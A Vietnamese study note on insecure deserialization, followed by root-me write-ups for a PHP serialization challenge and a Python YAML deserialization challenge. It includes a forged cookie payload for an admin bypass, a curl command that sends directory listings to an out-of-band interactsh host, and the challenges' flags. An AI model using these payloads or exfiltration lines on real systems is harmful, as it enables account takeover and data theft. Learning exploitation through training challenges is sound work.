```
+ Tìm hiểu về Insecure Deserialization.(Khái niệm , nguyên nhân, tác hại, cách phòng chống).
+ Làm lab demo.
+ Làm các bài trên root-me
```
# Insecure Deserialization
## Khái niệm
Đầu tiền cần hiểu vể serialization và deserialization:
- Serialization là quá trình chuyển đổi đối tượng hoặc cấu trúc dữ liệu thành định dạng khác như chuỗi, chuỗi byte,... (serialized data) để dễ dàng lưu trữ và truyền tải.
- Deserialization là quá trình ngược lại với serialization là từ serialized data khôi phục lại đối tượng hoặc cấu trúc dữ liệu ban đầu.
Insecure Deserialization là lỗ hổng bảo mật xảy ra khi kẻ tấn công có thể kiểm soát được serialized data từ đó khi quá trình deserialization thực hiện, kẻ tấn công có thể thực thi mã độc trên ứng dụng, kiểm soát các đối tượng thậm chí là máy chủ ...
## Nguyên nhân 
Nguyên nhân chính là do ứng dụng cho phép deserialize từ serialized data mà người dùng có thể kiểm soát được. <br>
Ngoài ra còn do 1 số nguyên nhân như:
- Không kiểm tra đầu vào
- Sử dụng thư viện để deserialize không an toàn 
- ...
## Tác hại
Lỗ hổng này có thể gây ra nhiều tác hại nghiêm trọng:
- Thực thi các mã độc trên ứng dụng, có thể RCE.
- Thay đổi các thuộc tính đối tượng,...
- Gây tràn bộ nhớ ảnh hưởng tới ứng dụng và máy chủ.
- Dẫn đến 1 số cuộc tấn công khác
## Các phòng chống
Tốt nhất là không dùng dữ liệu từ người dùng để thực hiện quá trình deserialization.<br>
Tuy nhiên trong trường hợp phải dùng thì cần:
- Xác mính tính toàn vẹn của dữ liệu ví dụ như dùng chữ ký số,...
- Giới hạn quyền truy cập, chạy ứng dụng trong quyền thấp.
- Kiểm tra đầu vào.
- Sử dụng thư viện deserialization an toàn và thường xuyên cập nhật chúng.


# Rootme
## PHP - Serialization
Vào bài là 1 form login và có cho source code: 

![image](https://user-images.githubusercontent.com/92881216/236372592-3138eddf-1855-4931-bfe5-0ab233276ace.png)

source:
```
<?php
define('INCLUDEOK', true);
session_start();

if(isset($_GET['showsource'])){
    show_source(__FILE__);
    die;
}

/******** AUTHENTICATION *******/
// login / passwords in a PHP array (sha256 for passwords) !
require_once('./passwd.inc.php');


if(!isset($_SESSION['login']) || !$_SESSION['login']) {
    $_SESSION['login'] = "";
    // form posted ?
    if($_POST['login'] && $_POST['password']){
        $data['login'] = $_POST['login'];
        $data['password'] = hash('sha256', $_POST['password']);
    }
    // autologin cookie ?
    else if($_COOKIE['autologin']){
        $data = unserialize($_COOKIE['autologin']);
        $autologin = "autologin";
    }

    // check password !
    if ($data['password'] == $auth[ $data['login'] ] ) {
        $_SESSION['login'] = $data['login'];

        // set cookie for autologin if requested
        if($_POST['autologin'] === "1"){
            setcookie('autologin', serialize($data));
        }
    }
    else {
        // error message
        $message = "Error : $autologin authentication failed !";
    }
}
/*********************************/
?>



<html>
<head>
<style>
label {
    display: inline-block;
    width:150px;
    text-align:right;
}
input[type='password'], input[type='text'] {
    width: 120px;
}
</style>
</head>
<body>
<h1>Restricted Access</h1>

<?php

// message ?
if(!empty($message))
    echo "<p><em>$message</em></p>";

// admin ?
if($_SESSION['login'] === "superadmin"){
    require_once('admin.inc.php');
}
// user ?
elseif (isset($_SESSION['login']) && $_SESSION['login'] !== ""){
    require_once('user.inc.php');
}
// not authenticated ? 
else {
?>
<p>Demo mode with guest / guest !</p>

<p><strong>superadmin says :</strong> New authentication mechanism without any database. <a href="index.php?showsource">Our source code is available here.</a></p>

<form name="authentification" action="index.php" method="post">
<fieldset style="width:400px;">
<p>
    <label>Login :</label>
    <input type="text" name="login" value="" />
</p>
<p>
    <label>Password :</label>
    <input type="password" name="password" value="" />
</p>
<p>
    <label>Autologin next time :</label>
    <input type="checkbox" name="autologin" value="1" />
</p>
<p style="text-align:center;">
    <input type="submit" value="Authenticate" />
</p>
</fieldset>
</form>
<?php
}

if(isset($_SESSION['login']) && $_SESSION['login'] !== ""){
    echo "<p><a href='disconnect.php'>Disconnect</a></p>";
}
?>
</body>
</html>
```
Nói chung là web có chức năng xác thực với 2 param là `login` và `password` (được hash dạng sha256) được lưu vào mảng `data`.

Sau đó cookie được set với serialized data - nơi mà người dùng kiểm soát được:
```
if($_POST['autologin'] === "1"){
            setcookie('autologin', serialize($data));
        }
```
Dữ liệu này sẽ được `unserialize()`:
```
...
else if($_COOKIE['autologin']){
        $data = unserialize($_COOKIE['autologin']);
        $autologin = "autologin";
    }
```
Bài yêu cầu lấy quyền admin:
```
if($_SESSION['login'] === "superadmin"){
    require_once('admin.inc.php');
}
```
Bây giờ login với `guest/guest` cho trước:

![image](https://user-images.githubusercontent.com/92881216/236373883-ca1fe0d1-6a22-4f20-b7e6-69ba947fe837.png)

Kiểm tra cookie : 

![image](https://user-images.githubusercontent.com/92881216/236373934-afb83939-2e6a-4170-8a96-c413b79f06b4.png)

Decode URL chúng được:
```
a:2:{s:5:"login";s:5:"guest";s:8:"password";s:64:"84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec";}
```
Vậy đây là serialized data, chúng ta có thể kiểm soát và thay đổi thuộc tính này. Thay đổi `guest` thành `superadmin` đồng thời số lượng ký tự thay từ 5 thành 10. Tuy nhiên web còn check password nữa:
```
 if ($data['password'] == $auth[ $data['login'] ] ) {
        $_SESSION['login'] = $data['login'];
...
```
password được hash bằng sha256 khá an toàn nhưng lại sử dụng so sánh loose (`==`) trong php. Đến đây nghĩ ngay đến dạng `Type Juggling`:

![image](https://user-images.githubusercontent.com/92881216/236374687-1d789156-df84-4383-aaa6-a53520bf6dad.png)

Nhìn vào bảng dễ dàng bypass được bằng cách cho password dạng boolean. Dạng boolean khi serialize:

![image](https://user-images.githubusercontent.com/92881216/236374931-2c0a7cb2-61d5-4949-b014-f8464ed32dda.png)

Vậy payload cuối cùng được:
```
a:2:{s:5:"login";s:10:"superadmin";s:8:"password";b:1;}
```
Bây giờ chỉ việc encode url chúng và sửa vào cookie

![image](https://user-images.githubusercontent.com/92881216/236375721-63bd0c37-f91b-4fca-a78b-eeca913a86c7.png)

> password: `NoUserInputInPHPSerialization!`

## Yaml - Deserialization
Vào web là dễ dạng thấy được URL chứ 1 đoạn chuỗi:

![image](https://user-images.githubusercontent.com/92881216/236376453-d2f55b00-5f81-4bae-ada3-85a156246bce.png)

Decode bằng base64 thử được kết quá:
```
yaml: We are currently initializing our new site ! 
```
Vậy `We are currently initializing our new site !` được in ra trên trang web. Đây có thể là serialized data mà ta kiểm soát được.<br>
Nhìn tổng quan thì có thể web sử dụng 1 thư viện liên quan đến yaml để thực hiên (un)serialize dữ liệu. 

Đọc tài liệu kèm theo :https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf , ta có thể thử khai thác theo `subproccess.Popen`. 1 tool giúp tạo payload dạng yaml: https://github.com/j0lt-github/python-deserialization-attack-payload-generator 

![image](https://user-images.githubusercontent.com/92881216/236377687-9ea84c97-4421-4c09-a9aa-4bcab97d73bd.png)

Sau đó encode base64 và test thử

![image](https://user-images.githubusercontent.com/92881216/236377792-bf40c614-d0d6-4f92-b461-895cdd0d4b29.png)

![image](https://user-images.githubusercontent.com/92881216/236377838-8412d44c-5d5c-445f-9387-ccb466e9870d.png)

Kết quả in ra `<subprocess.Popen object at 0x7f8049f84670>` và không có gì thêm. Đến đây em nghĩ đến việc thực hiện reverse shell nhưng làm mọi cách đều thất bại mặc dụ web server có thể thực hiện được curl. Sau khi tham khảo 1 số <a href="https://thanhlocpanda.wordpress.com/2023/01/11/root-me-yaml-deserialization-python/">bài</a> trên mạng em tìm ra được 1 cách khai thác với <a href="https://podalirius.net/en/articles/constructing-a-semi-interactive-reverse-shell-with-curl/">curl</a> hoặc có thể với <a href="https://podalirius.net/en/articles/constructing-a-semi-interactive-reverse-shell-with-wget/">wget</a>

Đầu tiên vào https://app.interactsh.com/ để xem request/response được url là `cha6cma2vtc0000baavggeidgkeyyyyyb.oast.fun`
Dùng tool lúc này tạo payload với command: `curl cha6cma2vtc0000baavggeidgkeyyyyyb.oast.fun --user-agent "$(ls -la|base64 -w0)"`

![image](https://user-images.githubusercontent.com/92881216/236379421-a78b6fc1-b72d-4b6c-aedd-abd6a74bcbbc.png)

Sau đó encode base64 

![image](https://user-images.githubusercontent.com/92881216/236379470-26595f49-c326-4f1b-bded-2be1179bc5ac.png)

Tiếp tục gửi và check:

![image](https://user-images.githubusercontent.com/92881216/236379528-1c96e2d6-fb95-4448-9322-3aa2e920647c.png)

Kết quả:

![image](https://user-images.githubusercontent.com/92881216/236379637-076cb054-34fc-4554-a7b5-64b8b51b38ad.png)

Bây giờ chỉ việc đọc file `.passwd`

...

Kết quả:
> .passwd: `561385a008727f860eda1afb7f8eba76`

